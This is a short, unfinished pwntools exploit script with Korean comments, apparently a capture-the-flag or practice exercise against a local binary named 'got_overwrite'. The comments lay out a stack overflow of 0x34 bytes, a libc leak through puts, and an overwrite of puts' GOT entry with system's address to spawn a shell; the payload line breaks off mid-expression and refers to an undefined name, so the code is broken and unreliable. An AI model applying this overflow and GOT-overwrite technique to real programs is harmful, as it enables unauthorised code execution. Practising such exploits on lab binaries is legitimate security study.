#! -*- coding:utf-8 -*-

from pwn import * 
p = process("./got_overwrite")

#문자열 입력을 받고, /bin/sh 를 출력하는 프로그램. 
#read 함수에서 총 0x49, 73바이트를 입력받는다. ret까지 거리는 0x34
#여기서 got overwrite 진행해보자. binsh 출력하는 함수가 puts니까
#puts의 got를 system함수의 주소로 덮어씌우면 될거같다. 
#순서는 read 함수로 puts함수 got에 system함수 주소를 입력받자. 
#근데 이때 system 함수 주소가 없다. libc leak 도 필요하다. 
# puts(puts_got)
# read(0,puts_got,4)



payload = "a"*0x34
payload += p32(read) + 